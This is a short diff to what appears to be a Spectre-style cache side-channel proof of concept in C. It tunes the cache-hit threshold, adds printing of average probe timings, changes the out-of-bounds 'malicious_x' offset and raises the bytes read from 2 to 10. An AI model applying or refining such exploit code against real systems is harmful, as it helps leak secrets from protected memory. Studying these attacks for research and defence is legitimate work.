@@ -13,7 +13,7 @@
 
 // Pin process to a CPU. To reduce noise, this CPU can be isolated.
 #define CPU_NUMBER 1
-#define CACHE_HIT_THRESHOLD (15)  /* assume cache hit if time <= threshold */
+#define CACHE_HIT_THRESHOLD (5)  /* assume cache hit if time <= threshold */
 
 #define TARGET_CACHE L1
 #define MSRMTS_PER_SAMPLE L1_SETS
@@ -182,7 +182,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 		// printf("\n");
 		for(int i=0;i<MSRMTS_PER_SAMPLE;i++){
 			if(avg[i] > CACHE_HIT_THRESHOLD){
-				printf("%d ",i);
+				printf("%d:%.2f ",i,avg[i]);
 			}
 		}
 		printf("\n");
@@ -194,7 +194,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 }
 
 int main(int argc, const char **argv) {
-	size_t malicious_x=-172232;   /* default for malicious_x */
+	size_t malicious_x=-184528;   /* default for malicious_x */
 	int i, score[2], len=40;
 	uint8_t value[2];
     
@@ -204,8 +204,8 @@ int main(int argc, const char **argv) {
 	// for (i = 0; i < sizeof(array2); i++)
 	// 	array2[i] = 1;    /* write to array2 so in RAM not copy-on-write zero pages */
 
+	len = 10;
 	printf("Reading %d bytes:\n", len);
-	len = 2;
 	// fprintf(stderr,"The target is: %p\n",&array2[array1[malicious_x]*64]);
 	// fprintf(stderr,"The target is: %d\n",((int)(&array2[array1[malicious_x]*64])>>6)&0b111111);
 	while (len--) {
